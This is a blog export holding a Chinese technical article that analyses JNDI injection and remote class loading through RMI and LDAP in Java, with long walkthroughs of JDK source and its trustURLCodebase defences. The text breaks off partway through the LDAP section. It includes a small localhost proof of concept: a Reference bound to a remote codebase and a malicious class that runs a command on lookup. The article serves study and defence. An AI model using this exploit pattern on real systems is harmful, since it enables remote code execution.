{"meta":{"title":"Halfblue","subtitle":null,"description":null,"author":"halfblue","url":"http://yoursite.com","root":"/"},"pages":[],"posts":[{"title":"JNDI注入与动态类加载","slug":"JNDI注入与动态类加载","date":"2021-11-18T02:17:06.000Z","updated":"2021-11-18T11:43:30.387Z","comments":true,"path":"2021/11/18/JNDI注入与动态类加载/","link":"","permalink":"http://yoursite.com/2021/11/18/JNDI%E6%B3%A8%E5%85%A5%E4%B8%8E%E5%8A%A8%E6%80%81%E7%B1%BB%E5%8A%A0%E8%BD%BD/","excerpt":"从spring到fastjson，许多反序列化漏洞里面都出现了JNDI注入的身影，详细分析下它的原理以及在攻击中的意义。","text":"从spring到fastjson，许多反序列化漏洞里面都出现了JNDI注入的身影，详细分析下它的原理以及在攻击中的意义。首先是JNDI的概念，来自官网： JNDIJava 命名和目录接口 (JNDI) 为用 Java 编程语言编写的应用程序提供命名和目录功能。它旨在独立于任何特定的命名或目录服务实现。因此，可以通过一种通用方式访问各种服务——新的、新兴的和已经部署的服务。JNDI 架构由 API（应用程序编程接口）和 SPI（服务提供者接口）组成。Java 应用程序使用此 API 来访问各种命名和目录服务。SPI 可以透明地插入各种命名和目录服务，允许使用 JNDI 技术的 API 的 Java 应用程序访问它们的服务。大概可以明白是类似通过名字查找对象的功能，感觉和RMI有点类似。在官方文档中用Linux文件系统以及DNS系统来类比JNDI，都是一种查找功能。还是先看个demo，原生JNDI支持RMI、LDAP、COS、DNS，官网都有教程，这里以RMI为例。官网的用法有三部分，RMI服务端、JNDI服务端、JNDI客户端RMI服务端： 1234567public class RMIServer &#123; public static void main(String[] args) throws RemoteException, AlreadyBoundException &#123; RemoteObjImpl remoteObj = new RemoteObjImpl(); Registry r = LocateRegistry.createRegistry(1099);// r.bind(&quot;remoteObj&quot;,remoteObj); &#125;&#125; JNDI服务端 1234567891011public class JNDIRMIServer &#123; public static void main(String[] args) throws Exception&#123; Hashtable env = new Hashtable(); env.put(Context.INITIAL_CONTEXT_FACTORY, &quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;); env.put(Context.PROVIDER_URL, &quot;rmi://localhost:1099&quot;); InitialContext initialContext = new InitialContext(env); initialContext.bind(&quot;remoteObj&quot;,new RemoteObjImpl()); &#125;&#125; JNDI客户端 123456789public class JNDIRMIClient&#123; public static void main( String[] args ) throws Exception &#123; InitialContext initialContext = new InitialContext(); IRemoteObj remoteObj = (IRemoteObj) initialContext.lookup(&quot;rmi://localhost/remoteObj2&quot;); System.out.println(remoteObj.sayHello(&quot;hello&quot;)); &#125;&#125; 运行后在JNDI客户端和JNDI服务端输出结果。如果没有JNDI服务端而是直接把远程对象绑定到RMI服务端上，JNDI客户端一样是可以获取的。此时在RMI服务端输出结果。实际和RMI的使用很类似，看上去只是一种封装。 RMI动态类加载说回RMI，之前的RMI使用中，都是在客户端和服务端同时定义了相同的远程接口。那么如果客户端没有服务端那个类的定义怎么办呢？为了解决这种需求Java很贴心的设计了一个叫codebase的东西，codebase实际上就是一种URL，客户端可以从URL里面动态加载类。这样一来客户端就不需要定义和实现远程接口，非常方便。但方便和安全总是对立的，显然这东西有很大的安全风险，所以在JDK7u21后，RMI默认配置java.rmi.server.useCodebaseOnly为true，也就是规定客户端不再接收服务端的codebase，而是必须只能从客户端自己从命令行或者代码里配置的codebase里面加载远程类，这样就避免了恶意服务端通过让客户端远程加载恶意类的方式来攻击客户端。跟一下具体的实现，实际上在RMI的反序列化流程就会调用，比如Registry_Stub#lookup反序列化远程对象的时候，就会调用到MarshalInputStream#resolveClass 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657protected Class&lt;?&gt; resolveClass(ObjectStreamClass classDesc) throws IOException, ClassNotFoundException&#123; /* * Always read annotation written by MarshalOutputStream * describing where to load class from. */ Object annotation = readLocation(); String className = classDesc.getName(); /* * Unless we were told to skip this consideration, choose the * &quot;default loader&quot; to simulate the default ObjectInputStream * resolveClass mechanism (that is, choose the first non-null * loader on the execution stack) to maximize the likelihood of * type compatibility with calling code. (This consideration * is skipped during server parameter unmarshalling using the 1.2 * stub protocol, because there would never be a non-null class * loader on the stack in that situation anyway.) */ ClassLoader defaultLoader = skipDefaultResolveClass ? null : latestUserDefinedLoader(); /* * If the &quot;java.rmi.server.useCodebaseOnly&quot; property was true or * useCodebaseOnly() was called or the annotation is not a String, * load from the local loader using the &quot;java.rmi.server.codebase&quot; * URL. Otherwise, load from a loader using the codebase URL in * the annotation. */ String codebase = null; if (!useCodebaseOnly &amp;&amp; annotation instanceof String) &#123; codebase = (String) annotation; &#125; try &#123; return RMIClassLoader.loadClass(codebase, className, defaultLoader); &#125; catch (AccessControlException e) &#123; return checkSunClass(className, e); &#125; catch (ClassNotFoundException e) &#123; /* * Fix for 4442373: delegate to ObjectInputStream.resolveClass() * to resolve primitive classes. */ try &#123; if (Character.isLowerCase(className.charAt(0)) &amp;&amp; className.indexOf(&#x27;.&#x27;) == -1) &#123; return super.resolveClass(classDesc); &#125; &#125; catch (ClassNotFoundException e2) &#123; &#125; throw e; &#125;&#125; 到一个RMIClassLoader的内部类 123456789private static RMIClassLoaderSpi newDefaultProviderInstance() &#123; return new RMIClassLoaderSpi() &#123; public Class&lt;?&gt; loadClass(String codebase, String name, ClassLoader defaultLoader) throws MalformedURLException, ClassNotFoundException &#123; return sun.rmi.server.LoaderHandler.loadClass( codebase, name, defaultLoader); &#125; LoaderHandler#loadClass 12345678910111213141516171819202122232425262728293031323334public static Class&lt;?&gt; loadClass(String codebase, String name, ClassLoader defaultLoader) throws MalformedURLException, ClassNotFoundException&#123; if (loaderLog.isLoggable(Log.BRIEF)) &#123; loaderLog.log(Log.BRIEF, &quot;name = \\&quot;&quot; + name + &quot;\\&quot;, &quot; + &quot;codebase = \\&quot;&quot; + (codebase != null ? codebase : &quot;&quot;) + &quot;\\&quot;&quot; + (defaultLoader != null ? &quot;, defaultLoader = &quot; + defaultLoader : &quot;&quot;)); &#125; URL[] urls; if (codebase != null) &#123; urls = pathToURLs(codebase); &#125; else &#123; urls = getDefaultCodebaseURLs(); &#125; if (defaultLoader != null) &#123; try &#123; Class&lt;?&gt; c = loadClassForName(name, false, defaultLoader); if (loaderLog.isLoggable(Log.VERBOSE)) &#123; loaderLog.log(Log.VERBOSE, &quot;class \\&quot;&quot; + name + &quot;\\&quot; found via defaultLoader, &quot; + &quot;defined by &quot; + c.getClassLoader()); &#125; return c; &#125; catch (ClassNotFoundException e) &#123; &#125; &#125; return loadClass(urls, name);&#125; 这里就看到了，如果没配置codebase就调用普通的Class.forName加载，配置了codebase的话也会先用本地类加载器去加载，找不到就调用下面的接收URL数组的loadClass： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293 private static Class&lt;?&gt; loadClass(URL[] urls, String name) throws ClassNotFoundException &#123; ClassLoader parent = getRMIContextClassLoader(); if (loaderLog.isLoggable(Log.VERBOSE)) &#123; loaderLog.log(Log.VERBOSE, &quot;(thread context class loader: &quot; + parent + &quot;)&quot;); &#125; /* * If no security manager is set, disable access to RMI class * loaders and simply delegate request to the parent loader * (see bugid 4140511). */ SecurityManager sm = System.getSecurityManager(); if (sm == null) &#123; try &#123; Class&lt;?&gt; c = Class.forName(name, false, parent); if (loaderLog.isLoggable(Log.VERBOSE)) &#123; loaderLog.log(Log.VERBOSE, &quot;class \\&quot;&quot; + name + &quot;\\&quot; found via &quot; + &quot;thread context class loader &quot; + &quot;(no security manager: codebase disabled), &quot; + &quot;defined by &quot; + c.getClassLoader()); &#125; return c; &#125; catch (ClassNotFoundException e) &#123; ...... &#125; /* * Get or create the RMI class loader for this codebase URL path * and parent class loader pair. */ Loader loader = lookupLoader(urls, parent); try &#123; if (loader != null) &#123; /* * Verify that the caller has permission to access this loader. */ loader.checkPermissions(); &#125; &#125; catch (SecurityException e) &#123; /* * If the current access control context does not have permission * to access all of the URLs in the codebase path, wrap the * resulting security exception in a ClassNotFoundException, so * the caller can handle this outcome just like any other class * loading failure (see bugid 4146529). */ try &#123; /* * But first, check to see if the named class could have been * resolved without the security-offending codebase anyway; * if so, return successfully (see bugids 4191926 &amp; 4349670). */ Class&lt;?&gt; c = loadClassForName(name, false, parent); if (loaderLog.isLoggable(Log.VERBOSE)) &#123; loaderLog.log(Log.VERBOSE, &quot;class \\&quot;&quot; + name + &quot;\\&quot; found via &quot; + &quot;thread context class loader &quot; + &quot;(access to codebase denied), &quot; + &quot;defined by &quot; + c.getClassLoader()); &#125; return c; &#125; catch (ClassNotFoundException unimportant) &#123; ...... &#125; &#125; try &#123; Class&lt;?&gt; c = loadClassForName(name, false, loader); if (loaderLog.isLoggable(Log.VERBOSE)) &#123; loaderLog.log(Log.VERBOSE, &quot;class \\&quot;&quot; + name + &quot;\\&quot; &quot; + &quot;found via codebase, &quot; + &quot;defined by &quot; + c.getClassLoader()); &#125; return c; &#125; catch (ClassNotFoundException e) &#123;...... &#125; &#125; private void checkPermissions() &#123; SecurityManager sm = System.getSecurityManager(); if (sm != null) &#123; // should never be null? Enumeration&lt;Permission&gt; enum_ = permissions.elements(); while (enum_.hasMoreElements()) &#123; sm.checkPermission(enum_.nextElement()); &#125; &#125; &#125; 里面还先得配置SecurityManager，不然还是用本地类加载器加载。基本是非常极端的环境，除非客户端主动开了这个功能，不然很难从默认配置进行攻击。 JNDI+RMI动态类加载说了这么多RMI动态加载，和JNDI有啥关系呢？其实JNDI也提供了一种动态加载类的方式，就是使用Reference。所谓Reference，就是指不直接把对象绑定到上下文目录里，而是提供一个工厂类，使用时从这个工厂类里面创建出要调用的对象，并且这个工厂类是可以从codebase动态加载的。官网教程https://docs.oracle.com/javase/jndi/tutorial/objects/factory/interface.html从这个描述就可以知道实际上这个过程会导致任意的类加载并实例化，进而导致任意代码执行。比如这样：服务端 123456789101112public class JNDIRMIServer &#123; public static void main(String[] args) throws Exception&#123; Hashtable env = new Hashtable(); env.put(Context.INITIAL_CONTEXT_FACTORY, &quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;); env.put(Context.PROVIDER_URL, &quot;rmi://localhost:1099&quot;); InitialContext initialContext = new InitialContext(env); Reference refObj = new Reference(&quot;TestRef&quot;, &quot;TestRef&quot;, &quot;http://localhost:7777/&quot;); initialContext.bind(&quot;remoteObj&quot;, refObj); &#125;&#125; 使用JNDI需要创建一个InitialContext，然后配置属性来确定用什么服务，比如目前是RMI服务。客户端 12345678public class JNDIRMIClient&#123; public static void main( String[] args ) throws Exception &#123; InitialContext initialContext = new InitialContext(); initialContext.lookup(&quot;rmi://localhost:1099/remoteObj&quot;); &#125;&#125; 在客户端的例子看出也可以不传配置，直接传一个带着协议的URL，JNDI可以自己分析协议确定对应的服务。有的文章说只有lookup和search可以，实际上服务端bind的时候也可以。TestRef 12345public class TestRef &#123; public TestRef() throws IOException &#123; Runtime.getRuntime().exec(&quot;calc&quot;); &#125;&#125; 客户端lookup的时候就会触发类的加载和实例化，导致代码执行。分析下具体调用流程，首先在InitialContext#lookup： 123public Object lookup(String name) throws NamingException &#123; return getURLOrDefaultInitCtx(name).lookup(name);&#125; 先看看getURLOrDefaultInitCtx 1234567891011121314protected Context getURLOrDefaultInitCtx(String name) throws NamingException &#123; if (NamingManager.hasInitialContextFactoryBuilder()) &#123; return getDefaultInitCtx(); &#125; String scheme = getURLScheme(name); if (scheme != null) &#123; Context ctx = NamingManager.getURLContext(scheme, myProps); if (ctx != null) &#123; return ctx; &#125; &#125; return getDefaultInitCtx();&#125; 获取协议也就是rmi，然后调用NamingManager.getURLContext，返回的是一个rmiURLContext那么实际调用的就是rmiURLContext#lookup，但是rmiURLContext并没有重写lookup，所以调用到GenericURLContext#lookup 123456789public Object lookup(String name) throws NamingException &#123; ResolveResult res = getRootURLContext(name, myEnv); Context ctx = (Context)res.getResolvedObj(); try &#123; return ctx.lookup(res.getRemainingName()); &#125; finally &#123; ctx.close(); &#125;&#125; 具体流程不重要，之后调用了RegistryContext#lookup 1234567891011121314public Object lookup(Name name) throws NamingException &#123; if (name.isEmpty()) &#123; return (new RegistryContext(this)); &#125; Remote obj; try &#123; obj = registry.lookup(name.get(0)); &#125; catch (NotBoundException e) &#123; throw (new NameNotFoundException(name.get(0))); &#125; catch (RemoteException e) &#123; throw (NamingException)wrapRemoteException(e).fillInStackTrace(); &#125; return (decodeObject(obj, name.getPrefix(1)));&#125; 可以看到调用了RegistryImpl_Stub#lookup，那么这里一样会有JRMP攻击和注册中心攻击客户端的问题。之后调用decodeObject 123456789101112131415161718private Object decodeObject(Remote r, Name name) throws NamingException &#123; try &#123; Object obj = (r instanceof RemoteReference) ? ((RemoteReference)r).getReference() : (Object)r; return NamingManager.getObjectInstance(obj, name, this, environment); &#125; catch (NamingException e) &#123; throw e; &#125; catch (RemoteException e) &#123; throw (NamingException) wrapRemoteException(e).fillInStackTrace(); &#125; catch (Exception e) &#123; NamingException ne = new NamingException(); ne.setRootCause(e); throw ne; &#125;&#125; 首先做一个类型判断，如果r是RemoteReference类型，就把obj赋值为((RemoteReference)r).getReference()，r就是从注册中心获取到的stub对象，之前在JNDI服务端绑定的是一个Reference对象，但现在这里获取到的r是一个ReferenceWrapper_Stub对象，很明显在绑定时JNDI做了些默认处理，简单看一下，在RegistryContext#bind 1234567891011121314151617181920212223242526272829303132333435public void bind(Name name, Object obj) throws NamingException &#123; if (name.isEmpty()) &#123; throw (new InvalidNameException( &quot;RegistryContext: Cannot bind empty name&quot;)); &#125; try &#123; registry.bind(name.get(0), encodeObject(obj, name.getPrefix(1))); &#125; catch (AlreadyBoundException e) &#123; NamingException ne = new NameAlreadyBoundException(name.get(0)); ne.setRootCause(e); throw ne; &#125; catch (RemoteException e) &#123; throw (NamingException)wrapRemoteException(e).fillInStackTrace(); &#125;&#125;private Remote encodeObject(Object obj, Name name) throws NamingException, RemoteException&#123; obj = NamingManager.getStateToBind(obj, name, this, environment); if (obj instanceof Remote) &#123; return (Remote)obj; &#125; if (obj instanceof Reference) &#123; return (new ReferenceWrapper((Reference)obj)); &#125; if (obj instanceof Referenceable) &#123; return (new ReferenceWrapper(((Referenceable)obj).getReference())); &#125; throw (new IllegalArgumentException( &quot;RegistryContext: &quot; + &quot;object to bind must be Remote, Reference, or Referenceable&quot;));&#125; 可以看到绑定的时候会自动套上一层ReferenceWrapper，网上很多例子抄来抄去都是手动写了一个，多此一举。ReferenceWrapper是继承了UnicastRemoteObject的RemoteReference对象，调用getReference方法时可以返回一个Reference，经过它的封装相当于把Reference对象转化为远程对象。注册中心正常进行绑定，客户端获取的时候一样是拿到stub对象。看看这个stub，ReferenceWrapper_Stub这个类看来很不常用，整个openjdk里也没有源码。 12345678910111213141516171819202122232425262728293031public final class ReferenceWrapper_Stub extends RemoteStub implements RemoteReference, Remote &#123; private static final long serialVersionUID = 2L; private static Method $method_getReference_0; static &#123; try &#123; $method_getReference_0 = (class$com$sun$jndi$rmi$registry$RemoteReference != null ? class$com$sun$jndi$rmi$registry$RemoteReference : (class$com$sun$jndi$rmi$registry$RemoteReference = class$(&quot;com.sun.jndi.rmi.registry.RemoteReference&quot;))).getMethod(&quot;getReference&quot;); &#125; catch (NoSuchMethodException var0) &#123; throw new NoSuchMethodError(&quot;stub class initialization failed&quot;); &#125; &#125; public ReferenceWrapper_Stub(RemoteRef var1) &#123; super(var1); &#125; public Reference getReference() throws RemoteException, NamingException &#123; try &#123; Object var1 = super.ref.invoke(this, $method_getReference_0, (Object[])null, 3529874867989176284L); return (Reference)var1; &#125; catch (RuntimeException var2) &#123; throw var2; &#125; catch (RemoteException var3) &#123; throw var3; &#125; catch (NamingException var4) &#123; throw var4; &#125; catch (Exception var5) &#123; throw new UnexpectedException(&quot;undeclared checked exception&quot;, var5); &#125; &#125;&#125; getReference调用了UnicastRef#invoke，相当于一次RMI客户端请求RMI服务端，反序列化获取调用结果。所以这里实际上也可以用RMI中服务端攻击客户端的攻击方式。反序列化获取到这个Reference后，调用NamingManager#getObjectInstance 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758public static Object getObjectInstance(Object refInfo, Name name, Context nameCtx, Hashtable&lt;?,?&gt; environment) throws Exception&#123; ObjectFactory factory; // Use builder if installed ObjectFactoryBuilder builder = getObjectFactoryBuilder(); if (builder != null) &#123; // builder must return non-null factory factory = builder.createObjectFactory(refInfo, environment); return factory.getObjectInstance(refInfo, name, nameCtx, environment); &#125; // Use reference if possible Reference ref = null; if (refInfo instanceof Reference) &#123; ref = (Reference) refInfo; &#125; else if (refInfo instanceof Referenceable) &#123; ref = ((Referenceable)(refInfo)).getReference(); &#125; Object answer; if (ref != null) &#123; String f = ref.getFactoryClassName(); if (f != null) &#123; // if reference identifies a factory, use exclusively factory = getObjectFactoryFromReference(ref, f); if (factory != null) &#123; return factory.getObjectInstance(ref, name, nameCtx, environment); &#125; // No factory found, so return original refInfo. // Will reach this point if factory class is not in // class path and reference does not contain a URL for it return refInfo; &#125; else &#123; // if reference has no factory, check for addresses // containing URLs answer = processURLAddrs(ref, name, nameCtx, environment); if (answer != null) &#123; return answer; &#125; &#125; &#125; // try using any specified factories answer = createObjectFromFactories(refInfo, name, nameCtx, environment); return (answer != null) ? answer : refInfo;&#125; 这个函数的功能就是从Reference里生成真正要调用的对象，生成对象的逻辑在getObjectFactoryFromReference 12345678910111213141516171819202122232425262728static ObjectFactory getObjectFactoryFromReference( Reference ref, String factoryName) throws IllegalAccessException, InstantiationException, MalformedURLException &#123; Class&lt;?&gt; clas = null; // Try to use current class loader try &#123; clas = helper.loadClass(factoryName); &#125; catch (ClassNotFoundException e) &#123; // ignore and continue // e.printStackTrace(); &#125; // All other exceptions are passed up. // Not in class path; try to use codebase String codebase; if (clas == null &amp;&amp; (codebase = ref.getFactoryClassLocation()) != null) &#123; try &#123; clas = helper.loadClass(factoryName, codebase); &#125; catch (ClassNotFoundException e) &#123; &#125; &#125; return (clas != null) ? (ObjectFactory) clas.newInstance() : null;&#125; 这里是重点了。首先会调用helper.loadClass，是com.sun.Naming.Internal.VersionHelper12#loadClass 1234567891011121314151617181920212223242526272829public Class&lt;?&gt; loadClass(String className) throws ClassNotFoundException &#123; return loadClass(className, getContextClassLoader());&#125;/** * Package private. * * This internal method is used with Thread Context Class Loader (TCCL), * please don&#x27;t expose this method as public. */Class&lt;?&gt; loadClass(String className, ClassLoader cl) throws ClassNotFoundException &#123; Class&lt;?&gt; cls = Class.forName(className, true, cl); return cls;&#125;/** * @param className A non-null fully qualified class name. * @param codebase A non-null, space-separated list of URL strings. */public Class&lt;?&gt; loadClass(String className, String codebase) throws ClassNotFoundException, MalformedURLException &#123; ClassLoader parent = getContextClassLoader(); ClassLoader cl = URLClassLoader.newInstance(getUrlArray(codebase), parent); return loadClass(className, cl);&#125; 这里有三个重载的loadClass，第一个相当于包装，主要看第二个和第三个。第二个其实是把Class.forName包装成loadClass，而这两者的区别是forName会触发类初始化，也就是会调用静态代码块，实际上是有安全隐患的。而第三个loadClass就更直接了，直接用参数codebase，也就是Reference里的classFactoryLocation参数，里面的路径创建一个URLClassLoader，用它来加载该类。这样实际上就允许了远程类加载，相当于允许了远程任意代码执行。而getObjectFactoryFromReference中的逻辑就是首先用本地AppClassLoader去加载factoryName类，找不到就用URLClassLoader去codeBase里的路径加载，最后实例化，当然这里就算不实例化也能执行代码，因为调用了forName。这里执行完会报错，因为 12345factory = getObjectFactoryFromReference(ref, f);if (factory != null) &#123; return factory.getObjectInstance(ref, name, nameCtx, environment);&#125; 恶意类不能转化为ObjectFactory，想不报错就继承这个类就行了。也可以正常返回然后重写getObjectInstance在里面执行命令。调试完就可以明白JNDI使用Reference代替远程对象的本意应该就是不通过反序列化直接传递对象，而是仅传递几个字符串，客户端用这几个名称去加载工厂类自己组装一个远程对象。把反序列化变成了远程类加载，如果不是为了加载客户端不存在的类的话，好像没有太大的意义。这里也没找到什么好的例子。分析到这就可以结束了，如果能控制客户端加载一个恶意的Reference，就能在客户端执行任意代码。和RMI的动态类加载一样，JAVA开发者意识到了其中的安全隐患，所以在jdk8u121之后，添加了一个com.sun.jndi.rmi.object.trustURLCodebase属性，对应RegistryContext#trustURLCodebase，如果这个属性为false就不能进行远程类加载。对应的代码变成了这样 1234567891011121314151617181920212223242526272829303132333435363738static final boolean trustURLCodebase;static &#123; // System property to control whether classes may be loaded from an // arbitrary URL codebase PrivilegedAction&lt;String&gt; act = () -&gt; System.getProperty( &quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;, &quot;false&quot;); String trust = AccessController.doPrivileged(act); trustURLCodebase = &quot;true&quot;.equalsIgnoreCase(trust);&#125;private Object decodeObject(Remote r, Name name) throws NamingException &#123; try &#123; Object obj = (r instanceof RemoteReference) ? ((RemoteReference)r).getReference() : (Object)r; /* * Classes may only be loaded from an arbitrary URL codebase when * the system property com.sun.jndi.rmi.object.trustURLCodebase * has been set to &quot;true&quot;. */ // Use reference if possible Reference ref = null; if (obj instanceof Reference) &#123; ref = (Reference) obj; &#125; else if (obj instanceof Referenceable) &#123; ref = ((Referenceable)(obj)).getReference(); &#125; if (ref != null &amp;&amp; ref.getFactoryClassLocation() != null &amp;&amp; !trustURLCodebase) &#123; throw new ConfigurationException( &quot;The object factory is untrusted. Set the system property&quot; + &quot; &#x27;com.sun.jndi.rmi.object.trustURLCodebase&#x27; to &#x27;true&#x27;.&quot;); &#125; return NamingManager.getObjectInstance(obj, name, this, environment); 可以看到是在RegistryContext里对com.sun.jndi.rmi.object.trustURLCodebase这个属性做了校验，但真正进行远程类加载的的NamingManager.getObjectInstance实际上没有做限制。也就是说虽然JNDI+RMI的方式进行远程加载就走不通了，但JNDI和其他服务的联动也许还有机会，oracle官网说JNDI内置支持LDAP、CORBA、RMI、DNS，挨个看一下哪些能动态类加载，并且看看有没有不受限制的。调试时JDK版本为8u141。 JNDI+LDAP动态类加载先看LDAP，服务端用Apache Directory Studio起了个LDAP。翻了翻官方文档，和RMI类似，LDAP也是可以绑定java对象的，列举了以下几种对象都可以：Java serializable objectsReferenceable objects and JNDI ReferencesObjects with attributes (DirContext)RMI (Java Remote Method Invocation) objects (including those that use IIOP)CORBA objectsJava里LDAP好像必须结合JNDI去使用。原理其实很简单，但是不会写这玩意的查询，鼓捣了半天。先来个传序列化对象的，比如HashMap：服务端，就是绑定一下。 1234567891011121314public class JNDILDAPServer &#123; public static void main(String[] args) throws Exception&#123; Hashtable env = new Hashtable(); env.put(Context.INITIAL_CONTEXT_FACTORY, &quot;com.sun.jndi.ldap.LdapCtxFactory&quot;); env.put(Context.PROVIDER_URL, &quot;ldap://localhost:10389&quot;); InitialContext initialContext = new InitialContext(env); HashMap map = new HashMap&lt;&gt;(); map.put(&quot;key&quot;,&quot;value&quot;); initialContext.rebind(&quot;cn=test,ou=users,dc=example,dc=com&quot;, map); &#125;&#125; 1234567public class JNDILDAPClient &#123; public static void main(String[] args) throws Exception&#123; InitialContext initialContext = new InitialContext(); Object obj = initialContext.lookup(&quot;ldap://localhost:10389/cn=test,ou=users,dc=example,dc=com&quot;); System.out.println(obj); &#125;&#125; 跟一下调用流程，还是到GenericURLContext#lookup，然后到PartialCompositeContext#lookup 1234567891011121314151617181920public Object lookup(Name name) throws NamingException &#123; PartialCompositeContext ctx = this; Hashtable&lt;?,?&gt; env = p_getEnvironment(); Continuation cont = new Continuation(name, env); Object answer; Name nm = name; try &#123; answer = ctx.p_lookup(nm, cont); while (cont.isContinue()) &#123; nm = cont.getRemainingName(); ctx = getPCContext(cont); answer = ctx.p_lookup(nm, cont); &#125; &#125; catch (CannotProceedException e) &#123; Context cctx = NamingManager.getContinuationContext(e); answer = cctx.lookup(e.getRemainingName()); &#125; return answer;&#125; 然后到ComponentContext#p_lookup 123456789101112131415161718192021222324252627protected Object p_lookup(Name name, Continuation cont) throws NamingException &#123; Object ret = null; HeadTail res = p_resolveIntermediate(name, cont); switch (res.getStatus()) &#123; case TERMINAL_NNS_COMPONENT: ret = c_lookup_nns(res.getHead(), cont); if (ret instanceof LinkRef) &#123; cont.setContinue(ret, res.getHead(), this); ret = null; &#125; break; case TERMINAL_COMPONENT: ret = c_lookup(res.getHead(), cont); if (ret instanceof LinkRef) &#123; cont.setContinue(ret, res.getHead(), this); ret = null; &#125; break; default: /* USE_CONTINUATION */ /* pcont already set or exception thrown */ break; &#125; return ret;&#125; 又到LdapCtx#c_lookup 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384protected Object c_lookup(Name name, Continuation cont) throws NamingException &#123; cont.setError(this, name); Object obj = null; Attributes attrs; try &#123; SearchControls cons = new SearchControls(); cons.setSearchScope(SearchControls.OBJECT_SCOPE); cons.setReturningAttributes(null); // ask for all attributes cons.setReturningObjFlag(true); // need values to construct obj LdapResult answer = doSearchOnce(name, &quot;(objectClass=*)&quot;, cons, true); respCtls = answer.resControls; // retrieve response controls // should get back 1 SearchResponse and 1 SearchResult if (answer.status != LdapClient.LDAP_SUCCESS) &#123; processReturnCode(answer, name); &#125; if (answer.entries == null || answer.entries.size() != 1) &#123; // found it but got no attributes attrs = new BasicAttributes(LdapClient.caseIgnore); &#125; else &#123; LdapEntry entry = answer.entries.elementAt(0); attrs = entry.attributes; Vector&lt;Control&gt; entryCtls = entry.respCtls; // retrieve entry controls if (entryCtls != null) &#123; appendVector(respCtls, entryCtls); // concatenate controls &#125; &#125; if (attrs.get(Obj.JAVA_ATTRIBUTES[Obj.CLASSNAME]) != null) &#123; // serialized object or object reference obj = Obj.decodeObject(attrs); &#125; if (obj == null) &#123; obj = new LdapCtx(this, fullyQualifiedName(name)); &#125; &#125; catch (LdapReferralException e) &#123; if (handleReferrals == LdapClient.LDAP_REF_THROW) throw cont.fillInException(e); // process the referrals sequentially while (true) &#123; LdapReferralContext refCtx = (LdapReferralContext)e.getReferralContext(envprops, bindCtls); // repeat the original operation at the new context try &#123; return refCtx.lookup(name); &#125; catch (LdapReferralException re) &#123; e = re; continue; &#125; finally &#123; // Make sure we close referral context refCtx.close(); &#125; &#125; &#125; catch (NamingException e) &#123; throw cont.fillInException(e); &#125; try &#123; return DirectoryManager.getObjectInstance(obj, name, this, envprops, attrs); &#125; catch (NamingException e) &#123; throw cont.fillInException(e); &#125; catch (Exception e) &#123; NamingException e2 = new NamingException( &quot;problem generating object using object factory&quot;); e2.setRootCause(e); throw cont.fillInException(e2); &#125;&#125; 这个类可以类比RegistryContext，是JNDI基于LDAP实现的核心逻辑类，那么重点看这个函数是否触发了远程类加载。很明显看到了两处敏感调用，一处Obj.decodeObject和一处DirectoryManager.getObjectInstance。当前满足if语句，会进入第一处，那么看一下：Obj#decodeObject 1234567891011121314151617181920212223242526272829303132333435363738/* * Decode an object from LDAP attribute(s). * The object may be a Reference, or a Serialized object. * * See encodeObject() and encodeReference() for details on formats * expected. */static Object decodeObject(Attributes attrs) throws NamingException &#123; Attribute attr; // Get codebase, which is used in all 3 cases. String[] codebases = getCodebases(attrs.get(JAVA_ATTRIBUTES[CODEBASE])); try &#123; if ((attr = attrs.get(JAVA_ATTRIBUTES[SERIALIZED_DATA])) != null) &#123; ClassLoader cl = helper.getURLClassLoader(codebases); return deserializeObject((byte[])attr.get(), cl); &#125; else if ((attr = attrs.get(JAVA_ATTRIBUTES[REMOTE_LOC])) != null) &#123; // For backward compatibility only return decodeRmiObject( (String)attrs.get(JAVA_ATTRIBUTES[CLASSNAME]).get(), (String)attr.get(), codebases); &#125; attr = attrs.get(JAVA_ATTRIBUTES[OBJECT_CLASS]); if (attr != null &amp;&amp; (attr.contains(JAVA_OBJECT_CLASSES[REF_OBJECT]) || attr.contains(JAVA_OBJECT_CLASSES_LOWER[REF_OBJECT]))) &#123; return decodeReference(attrs, codebases); &#125; return null; &#125; catch (IOException e) &#123; NamingException ne = new NamingException(); ne.setRootCause(e); throw ne; &#125;&#125; 注释里写了，从LDAP查询返回值里解码出一个Object或者Reference。上来先获取codebase，可以在绑定的时候new BasicAttributes(“javaCodebase”, codebase)添加。然后后续有三种还原对象的方法，都是用这个codebase加载。看一下这三种方法，先看第一个if，走正常Java反序列化：首先用codebase创建一个URLClassLoadercom.sun.jndi.ldap.VersionHelper12#getURLClassLoader 12345678910111213141516171819202122232425262728private static final String TRUST_URL_CODEBASE_PROPERTY = &quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;;// Determine whether classes may be loaded from an arbitrary URL code base.private static final String trustURLCodebase = AccessController.doPrivileged( new PrivilegedAction&lt;String&gt;() &#123; public String run() &#123; return System.getProperty(TRUST_URL_CODEBASE_PROPERTY, &quot;false&quot;); &#125; &#125; );ClassLoader getURLClassLoader(String[] url) throws MalformedURLException &#123; ClassLoader parent = getContextClassLoader(); /* * Classes may only be loaded from an arbitrary URL code base when * the system property com.sun.jndi.ldap.object.trustURLCodebase * has been set to &quot;true&quot;. */ if (url != null &amp;&amp; &quot;true&quot;.equalsIgnoreCase(trustURLCodebase)) &#123; return URLClassLoader.newInstance(getUrlArray(url), parent); &#125; else &#123; return parent; &#125;&#125; 这个类有同名类，不在一个包底下，容易看错。这是jdk8u141的代码，注意到这里实际上也限制了系统属性，但不是之前RMI的那个trustURLCodebase属性，而是需要com.sun.jndi.ldap.object.trustURLCodebase为true。这个类里默认是false，也就是这个点默认是不能远程类加载的。回来看下一步Obj#deserializeObject 12345678910111213141516171819202122232425/* * Deserializes a byte array into an object. */private static Object deserializeObject(byte[] obj, ClassLoader cl) throws NamingException &#123; try &#123; // Create ObjectInputStream for deserialization ByteArrayInputStream bytes = new ByteArrayInputStream(obj); try (ObjectInputStream deserial = cl == null ? new ObjectInputStream(bytes) : new LoaderInputStream(bytes, cl)) &#123; return deserial.readObject(); &#125; catch (ClassNotFoundException e) &#123; 